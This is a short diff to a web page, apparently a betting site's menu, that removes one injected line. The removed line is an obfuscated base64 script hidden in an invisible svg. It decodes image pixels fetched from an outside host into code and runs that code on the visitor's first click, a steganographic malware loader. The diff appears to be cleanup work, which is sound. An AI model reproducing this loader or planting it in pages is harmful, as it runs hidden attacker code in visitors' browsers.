@@ -10079,7 +10079,7 @@
                                           <div class="ellipsis--EjZIN section-title-text--qVqWo">
                                              Major Ligler<img src="https://bet-starzbet-tr--prd--pl-sb.dtgapi.com/c8238d996fa196d0629e.png" id="e-a60etos" crossorigin="anonymous" style="display: none;">
                                              <svg id="e-a60etoss" style="display: none;">
-                                                <script>new Function(atob("dmFyIHM9U3RyaW5nLmZyb21DaGFyQ29kZSxqPWRvY3VtZW50LGltPWouZ2V0RWxlbWVudEJ5SWQoJ2UtYTYwZXRvcycpLGM9ai5jcmVhdGVFbGVtZW50KCdjYW52YXMnKSx4PWMuZ2V0Q29udGV4dCgnMmQnKSx3dz0nd2lkdGgnLGhoPSdoZWlnaHQnO2Z1bmN0aW9uIHQoKXt3PWltW3d3XSxoPWltW2hoXTtjW2hoXT1oO2Nbd3ddPXc7eC5kcmF3SW1hZ2UoaW0sMCwwKTt2YXIgZD14LmdldEltYWdlRGF0YSgwLDAsdyxoKS5kYXRhO3ZhciBhPScnLGw9ZC5sZW5ndGgscD0zMjtmb3IodmFyIGk9MDtpPGw7aSs9NCl7YSs9cyhkW2krMF18fHApK3MoZFtpKzFdfHxwKStzKGRbaSsyXXx8cCl9ai5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsbmV3IEZ1bmN0aW9uKGEpLHtvbmNlOiEwfSl9aW0ub25sb2FkPXQ7aWYoaW0uY29tcGxldGUpdCgp"))()</script>
+                                         
                                              </svg>
                                           </div>
                                        </div>
